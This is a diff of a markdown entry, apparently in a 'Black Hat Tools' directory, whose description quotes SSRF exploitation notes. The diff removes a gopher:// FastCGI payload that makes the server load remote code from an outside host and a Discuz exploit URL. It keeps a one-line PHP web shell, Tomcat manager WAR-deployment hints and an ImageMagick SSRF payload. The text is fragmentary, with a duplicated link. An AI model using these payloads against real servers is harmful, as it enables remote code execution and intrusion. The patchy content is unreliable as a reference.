@@ -1,5 +1,4 @@
 ---
-title: "https://github.com/undefinedd/extract0r-"
 description: "常見例子
 
 
@@ -45,9 +44,9 @@ example
 
 Discuz Pwn
 
-302.php: <?php header( \"Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00\" );
+
 x: <?php system($_GET['cmd']); ?>
-visit: /forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]
+
 
 
 
@@ -77,7 +76,7 @@ Example
 N1CTF 2021 - Funny_web
 
 
-Tool: https://github.com/hack2fun/gopher_attack_mssql
+
 
 
 
@@ -85,7 +84,7 @@ Tomcat
 
 透過 tomcat manager 部署 war
 要先有帳密，可以從 tomcat-users.xml 讀，或是踹預設密碼
-Tool: https://github.com/pimps/gopher-tomcat-deployer
+
 e.g. CTFZone 2019 qual - Catcontrol
 
 
@@ -109,7 +108,7 @@ payload: ssrf.mvg
 
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(http://example.com/)'
+
 pop graphic-context
 
 
@@ -119,5 +118,8 @@ $ convert ssrf.mvg out.png
 
 "
 external_category: "Black Hat Tools"
----[Visit Website](https://github.com/undefinedd/extract0r-)
+---
+[Visit Website](https://github.com/undefinedd/extract0r-)
+
+[Visit Website](https://github.com/undefinedd/extract0r-)
 
